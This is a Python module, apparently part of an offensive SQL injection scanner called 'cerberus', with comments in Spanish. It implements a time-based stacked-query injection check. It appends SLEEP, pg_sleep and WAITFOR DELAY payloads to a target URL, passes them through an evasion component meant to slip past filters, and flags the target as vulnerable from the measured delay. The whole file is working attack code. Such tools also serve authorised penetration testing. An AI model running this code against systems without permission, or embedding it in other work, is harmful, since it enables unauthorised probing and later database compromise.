import logging
import time
from typing import Dict, Any
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_stacked")

class VectorStacked(BaseVector):
    """
    Motor nativo asíncrono para inyección basada en consultas apiladas (Stacked Queries).
    Prueba si el motor permite múltiples sentencias separadas por ';'.
    """

    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Stacked-based sobre {self.target_url}")
        
        # Instanciar el evasor dinámico
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        delay_seconds = 5
        # Payload que intenta apilar un sleep
        # MySQL: ; SELECT SLEEP(5)--
        # PostgreSQL: ; SELECT pg_sleep(5)--
        # MS-SQL: ; WAITFOR DELAY '0:0:5'--
        payloads = [
            f"; SELECT SLEEP({delay_seconds})-- ",
            f"; SELECT pg_sleep({delay_seconds})-- ",
            f"; WAITFOR DELAY '0:0:{delay_seconds}'-- ",
        ]

        # 1. Medición de Latencia Base
        base_latencies = []
        for _ in range(2):
            t0 = time.time()
            resp = await self._safe_get(self.target_url)
            t1 = time.time()
            if resp:
                base_latencies.append(t1 - t0)
                
        if not base_latencies:
            return {"status": "failed", "reason": "baseline_unreachable"}
            
        avg_base = sum(base_latencies) / len(base_latencies)

        for p_raw in payloads:
            payload = evader.evade(p_raw)
            test_url = f"{self.target_url}{payload}"
            
            t0 = time.time()
            resp = await self._safe_get(test_url)
            t1 = time.time()
            
            if not resp:
                continue
                
            delay_measured = t1 - t0
            if delay_measured >= (avg_base + delay_seconds - 1.0):
                logger.info(f"[+] Inyección Stacked-Query Exitosa: Multi-sentencia confirmada con payload {p_raw}")
                return {
                    "status": "vulnerable",
                    "technique": "Stacked queries",
                    "evidence": f"Baseline {avg_base:.2f}s, Delay Payload: {delay_measured:.2f}s with stacked query."
                }

        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            return await self.client.get(url, timeout=15.0)
        except Exception as e:
            logger.warning(f"Error HTTP en vector stacked: {e}")
            return None
